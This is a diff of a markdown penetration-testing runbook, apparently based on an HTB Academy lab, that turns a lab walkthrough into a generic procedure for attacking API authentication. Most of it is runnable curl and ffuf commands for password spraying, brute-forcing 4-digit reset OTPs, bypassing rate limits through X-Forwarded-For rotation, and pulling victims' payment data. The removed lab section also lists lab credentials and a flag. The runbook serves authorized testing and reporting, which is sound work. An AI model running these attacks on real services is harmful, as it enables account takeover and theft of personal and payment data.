@@ -1,250 +1,220 @@
-# Batch 02 — Broken Authentication (CWE-307 + weak policy)
+# Batch 02 — Broken Authentication (operator)
 
-## FILL IN
+## FILL IN (any API)
 
 ```bash
-BASE="http://154.57.164.65:31687"
-EMAIL="htbpentester3@hackthebox.com"
-PASS="HTBPentester3"
+BASE="https://api.example.com"
+LOGIN_PATH="/api/v1/authentication/.../sign-in"
+EMAIL="lowpriv@example.com"
+PASS="..."
 WL=/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
+# From OAS: password update, reset, OTP, MFA paths
+UPDATE_PATH="/api/v1/.../current-user"          # PATCH profile/password if any
+RESET_OTP_PATH="/api/v1/.../passwords/resets/email-otps"
+RESET_PATH="/api/v1/.../passwords/resets"
+FAIL_STRING="Invalid Credentials"               # capture from real fail
 ```
 
 ## GOAL
-Bypass or abuse authentication: weak password policy + **no rate limit** on login / OTP → account takeover.
-
-> **Not BOLA** (you become the victim with their password/OTP, not by swapping ids under your session).  
-> Evidence comment templates: [00-authz-authn-compare.md](./00-authz-authn-compare.md).
+Show authentication can be bypassed or abused: weak secrets, no rate limit, weak OTP, token issues → **account takeover**.
 
 ## TIME
 1–2 hours
 
 ## YOU NEED
-- Customer account (or register path)
-- `curl` + `ffuf`
-- Optional: pinchtab (Swagger), gori (capture)
+- At least one valid low-priv account **or** register  
+- Wordlist; optional second target emails  
+- curl + ffuf; pinchtab/gori optional  
 
 ---
 
-## WHY (30 seconds)
+## WHY (first principles)
 
-**Authentication** proves who you are.  
-**Broken Authentication** = you can get in as someone else or break the login process.
+**Authentication** = prove identity.  
+**Broken Authentication** = attacker becomes the victim without legitimately owning their secret (or by abusing login machinery).
 
-This lab shows **CWE-307 Improper Restriction of Excessive Authentication Attempts**:
+Common CWE-307 shape:
 
-1. API allows **weak passwords** (here: “at least 6 characters”, even `123456`).  
-2. Login has **no rate limit / lockout**.  
-3. Password **reset OTP** is short (4 digits) and also not rate-limited.
+1. Weak password rules  
+2. Unlimited login attempts  
+3. Short OTP / guessable recovery  
 
-So: dump emails → spray passwords **or** request OTP → brute OTP → set new password → steal data (payment options).
+Flow: inventory identities → spray passwords **or** brute OTP → use session → sensitive data.
+
+Not BOLA: you are not swapping object ids under your own session; you **are** the victim after secret compromise.
+
+See [00-authz-authn-compare.md](./00-authz-authn-compare.md).
 
 ---
 
-## DO THIS
+## DO THIS (generic)
 
-### 1) Login as customer → JWT
+### 1) Map auth surfaces (OAS / traffic)
+
+```text
+sign-in, sign-up, refresh, logout
+password update, forgot password, OTP email/SMS
+MFA verify, security questions
+```
 
 ```bash
-curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
+curl -sk -o openapi.json "$BASE/swagger/v1/swagger.json"
+grep -iE 'sign-in|password|otp|auth|token|reset' openapi.json | head -40
+```
+
+### 2) Login + baseline
+
+```bash
+curl -sk -X POST "$BASE$LOGIN_PATH" \
   -H 'Content-Type: application/json' \
   -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}"
+# Extract JWT/token — field names from OAS (jwt, access_token, token)
 ```
 
 ```bash
-JWT=$(curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
+curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../current-user"
+curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../roles/current-user"
+```
+
+### 3) Password policy (if update exists)
+
+```bash
+# Send deliberately weak passwords; record server errors
+# Try: short, only digits, common (password, 123456), long random
+```
+
+Document min length, complexity, blocklist, max length (tiny max = dead entropy).
+
+### 4) Capture fail response for automation
+
+```bash
+curl -sk -X POST "$BASE$LOGIN_PATH" \
   -H 'Content-Type: application/json' \
-  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}" \
-  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')
+  -d '{"Email":"nouser@x.com","Password":"wrong"}'
+# Note body + status for ffuf -fr / matcher
 ```
 
-### 2) Who am I + roles
+### 5) Build identity list for spray
+
+Sources: registration, `GetAll` users/customers (if role allows), leaks, provided scope list.
 
 ```bash
-curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
-  "$BASE/api/v1/customers/current-user"
-
-curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
-  "$BASE/api/v1/roles/current-user"
+# emails.txt one per line
 ```
 
-Lab roles: `Customers_UpdateByCurrentUser`, `Customers_Get`, `Customers_GetAll`.
+### 6) Password spray / brute (authorized only)
 
-### 3) List all customers (email inventory for spray)
-
-```bash
-curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
-  "$BASE/api/v1/customers" -o customers.json
-# extract emails → customerEmails.txt
-```
-
-**Note:** full list may also be **BOPLA** (extra fields) — next academy section. Here we only need emails for auth attacks.
-
-### 4) Prove weak password policy (PATCH current-user)
-
-Body shape (Swagger):
-
-```json
-{
-  "UpdatedCustomer": {
-    "Name": "HTBPentester3",
-    "Email": "htbpentester3@hackthebox.com",
-    "PhoneNumber": "449999999993",
-    "BirthDate": "1995-06-21",
-    "Password": "pass"
-  }
-}
-```
-
-```bash
-# too short → error "at least 6 characters"
-# Password: "123456" → successStatus true  (weak!)
-```
-
-Phone field may require digits only (`^\d+$`).  
-Update DTO may force **exactly 6** chars (min=max=6 in OAS) — still cryptographically weak.
-
-### 5) Fail message for ffuf filter
-
-```bash
-curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
-  -H 'Content-Type: application/json' \
-  -d '{"Email":"x@y.com","Password":"nope"}'
-# → {"errorMessage":"Invalid Credentials"}
-```
-
-### 6) Password brute force (high-value emails)
-
-```bash
-# customerEmails.txt — academy short list example:
-# OlawaleJones@yandex.com
-# IsabellaRichardson@gmail.com
-# WenSalazar@zoho.com
-# MasonJenkins@ymail.com   # flag target
-```
-
-**Per-email spray (reliable):**
+**Per-account (reliable):**
 
 ```bash
 ffuf -w "$WL" \
-  -u "$BASE/api/v1/authentication/customers/sign-in" \
+  -u "$BASE$LOGIN_PATH" \
   -X POST -H "Content-Type: application/json" \
-  -d '{"Email":"IsabellaRichardson@gmail.com","Password":"FUZZ"}' \
-  -fr "Invalid Credentials" -t 100 -mc all
+  -d "{\"Email\":\"TARGET@example.com\",\"Password\":\"FUZZ\"}" \
+  -fr "$FAIL_STRING" -t 50 -mc all
 ```
 
-**Dual wordlist (academy):**
+**Email × password (if dual wordlists work):**
 
 ```bash
 ffuf -w emails.txt:EMAIL -w "$WL:PASS" -mode clusterbomb \
-  -u "$BASE/api/v1/authentication/customers/sign-in" \
+  -u "$BASE$LOGIN_PATH" \
   -X POST -H "Content-Type: application/json" \
   -d '{"Email":"EMAIL","Password":"PASS"}' \
-  -fr "Invalid Credentials" -t 100
-# Note: some ffuf builds ignore 2nd -w; prefer per-email if stuck
+  -fr "$FAIL_STRING" -t 50
+# If second wordlist ignored by ffuf build → loop per email
 ```
 
-Lab hit: `IsabellaRichardson@gmail.com` / `qwerasdfzxcv`.
+Watch for **429/lockout/captcha**. None under load → CWE-307 style finding.
 
-### 7) OTP brute (when password list fails)
+### 7) OTP / recovery brute (if password spray fails)
 
 ```bash
-# Request email OTP
-curl -sk -X POST "$BASE/api/v1/authentication/customers/passwords/resets/email-otps" \
+# Request OTP
+curl -sk -X POST "$BASE$RESET_OTP_PATH" \
   -H 'Content-Type: application/json' \
-  -d '{"Email":"MasonJenkins@ymail.com"}'
+  -d '{"Email":"victim@example.com"}'
 
-# Also exists: .../resets/sms-otps
-
-# Reset with OTP + new weak password
-# POST /api/v1/authentication/customers/passwords/resets
-# {"Email":"...","OTP":"FUZZ","NewPassword":"123456"}
-
+# Brute short OTP (e.g. 4-digit)
 seq -w 0 9999 > otp-4digit.txt
 ffuf -w otp-4digit.txt \
-  -u "$BASE/api/v1/authentication/customers/passwords/resets" \
+  -u "$BASE$RESET_PATH" \
   -X POST -H "Content-Type: application/json" \
-  -d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"123456"}' \
-  -fr '"SuccessStatus":false' -t 100 -mc all
+  -d '{"Email":"victim@example.com","OTP":"FUZZ","NewPassword":"NewPass123!"}' \
+  -fr 'false' -t 50 -mc all
+# Tune -fr to real failure body
 ```
 
-Lab hit: OTP **`7526`** → password set to `123456`.
+Then login as victim; pull PII/payment/admin data for impact.
 
-### 8) Login as victim → payment options (flag path)
-
-```bash
-JWT2=$(curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
-  -H 'Content-Type: application/json' \
-  -d '{"Email":"MasonJenkins@ymail.com","Password":"123456"}' \
-  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')
-
-curl -sk -H "Authorization: Bearer $JWT2" \
-  "$BASE/api/v1/customers/payment-options/current-user"
-```
-
-Lab flag field: `accountNumber` on HTB Academy “Credit Card” option.
-
-### 9) Write 3 lines
+### 8) Operator log
 
 ```text
-Weak policy: yes/no
-Brute login hit:
-OTP hit:
+Weak policy: yes/no (detail)
+Rate limit login: yes/no
+Rate limit OTP: yes/no
+ATO accounts:
+Impact endpoints:
 ```
 
 ---
 
-## EDGE CASES (real world)
+## EDGE CASES (always)
 
-| # | Test | Why |
-|---|------|-----|
-| E1 | Count login failures before lockout / captcha | CWE-307 core |
-| E2 | Same spray from many `X-Forwarded-For` values | Bypass IP rate limits |
-| E3 | User-enumeration: different errors “invalid user” vs “bad password” | Focus spray |
-| E4 | Timing side-channel on login | Valid user slower? |
-| E5 | Password max length too small (here 6) | Entropy dead |
-| E6 | Common password blocklist absent | rockyou / xato hits |
-| E7 | OTP length / charset / TTL | 4-digit = 10k tries |
-| E8 | OTP reuse / no single-use | Race double submit |
-| E9 | Request OTP for any email without auth | Account spam + takeover path |
-| E10 | SMS OTP vs email OTP | Different entropy/channel |
-| E11 | MFA not required after password reset | Instant full session |
-| E12 | JWT after login: alg, exp, role claims | Leads to batch JWT |
-| E13 | Default / seed credentials | Admin portals |
-| E14 | Credential stuffing (email+pass from breaches) | Same as spray with pairs |
-| E15 | gori/Burp Intruder on sign-in + OTP | GUI alternative to ffuf |
+| # | Test |
+|---|------|
+| E1 | Failures until lockout / captcha |
+| E2 | `X-Forwarded-For` rotation vs IP limit |
+| E3 | User enumeration (different errors/timing) |
+| E4 | Password max length too small |
+| E5 | No common-password blocklist |
+| E6 | OTP length/charset/TTL/reuse |
+| E7 | OTP request without auth for any email |
+| E8 | MFA skip after reset |
+| E9 | JWT alg/exp/role after login |
+| E10 | Default credentials |
+| E11 | Credential stuffing with pairs |
+| E12 | gori/Burp Intruder on login+OTP |
 
 ---
 
-## Prevention (report language)
+## Evidence comment (paste)
 
-- Rate-limit / progressive delays / lockout on **login and OTP**  
-- Strong password policy (length ≥ 12, complexity, deny common passwords, history)  
-- MFA  
-- Long random OTPs, short TTL, attempt caps  
+```text
+Class: Broken Authentication (API2 / CWE-307 or policy weakness).
+[Login|OTP] accepts unlimited attempts / weak secrets.
+Evidence: fail body sample; spray/OTP success (redact secrets); no 429 under ~N rps.
+Not BOLA: obtained valid victim session via secret abuse, not object-id swap under our account.
+```
 
----
+## Prevention
+
+Rate-limit + lockout on login/OTP; strong password policy; MFA; long OTPs, short TTL, single-use.
 
 ## IF / THEN
 
-| You see | You do |
-|---------|--------|
-| Weak policy message | Document + spray high-value emails |
-| No lockout under high RPS | CWE-307 finding |
-| OTP short + unlimited | Prefer OTP brute over 10k×all users |
-| Payment / PII after takeover | Critical impact |
+| See | Do |
+|-----|-----|
+| Weak policy | Document + prioritize spray |
+| No rate limit | High automation risk finding |
+| OTP short | Prefer OTP path |
+| ATO + PII/payments | Critical impact |
+
+## NEXT
+→ [03-bopla-ede-mass-assignment.md](./03-bopla-ede-mass-assignment.md)
 
 ---
 
-## NEXT
-→ Academy next: Broken Object Property Level Authorization (BOPLA) — list endpoints already leak fields.
+## WORKED EXAMPLE (lab only — not the runbook)
 
-## Lab result (154.57.164.65:31687)
+Inlanefreight customer auth lab. Full proof: `../notes/inlanefreight-broken-auth/`.
 
-| Item | Result |
-|------|--------|
-| Weak policy | “at least 6 characters”; `123456` accepted |
-| Fail string | `Invalid Credentials` |
-| Isabella | `qwerasdfzxcv` via xato-10k |
-| Mason | OTP **7526** → reset → login |
-| Flag | `HTB{115a6329120e9eff13c4ec6a63343ed1}` in payment options |
+| Item | Example |
+|------|---------|
+| Login | `POST /api/v1/authentication/customers/sign-in` |
+| Fail | `Invalid Credentials` |
+| Policy | min 6; `123456` accepted on update |
+| Spray hit | Isabella / `qwerasdfzxcv` (xato-10k) |
+| OTP | 4-digit email OTP brute → reset → login |
+| Impact | payment-options as victim |
 | Evidence | `notes/inlanefreight-broken-auth/evidence/` |
